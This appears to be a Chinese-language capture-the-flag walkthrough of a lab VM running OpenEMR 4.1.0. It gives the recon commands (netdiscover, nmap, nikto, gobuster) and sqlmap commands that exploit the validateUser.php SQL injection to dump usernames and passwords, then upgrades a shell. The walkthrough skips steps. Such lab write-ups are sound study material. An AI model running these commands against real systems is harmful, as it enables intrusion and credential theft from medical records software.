级别：中级

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24
    

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.128
查看开放80和21端口

3、挖掘目录扫描

nikto -host http://192.168.207.128
3.1 找到robots.txt文件

3.2 robots.txt中的目录都不可以访问

3.3 使用gobuster进行测试

安装gobuster

apt-get install gobuster -y

使用测试字典

cd /opt/git clone https://github.com/danielmiessler/SecLists.git

使用gobuster扫描，排除4xx状态码

gobuster dir -u http://192.168.207.128/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 –e

4、查看OpenEMR v4.1.0，搜索该版本的信息

通过搜索引擎可以看到有sql注入的漏洞

5、使用sqlmap进行测试

sqlmap -u "http://192.168.207.128/openemr/interface/login/validateUser.php?u= " --dbs --batch
简介：https://www.linuxidc.com/linux/2012-09/70873.htm


OpenEMR 4.1.0及之前版本内的interface/login/validateUser.php存在SQL注入漏洞，可允许远程攻击者通过u参数执行任意SQL命令。

5.1 爆破数据表

sqlmap -u "http://192.168.207.128/openemr/interface/login/validateUser.php?u= " -D openemr --tables  --batch
查看有一个用户表user

5.2 爆破用户表

sqlmap -u "http://192.168.207.128/openemr/interface/login/validateUser.php?u= " -D openemr -T users --columns --batch

5.3 爆破用户名和密码

sqlmap -u "http://192.168.207.128/openemr/interface/login/validateUser.php?u= " -D openemr -T users -C "username,password" --dump --batch
得到用户名和密码

http://192.168.207.128/openemr/sites/default/config.php

6.4 得到shell

python -c 'import pty; pty.spawn("/bin/bash")'

su medical
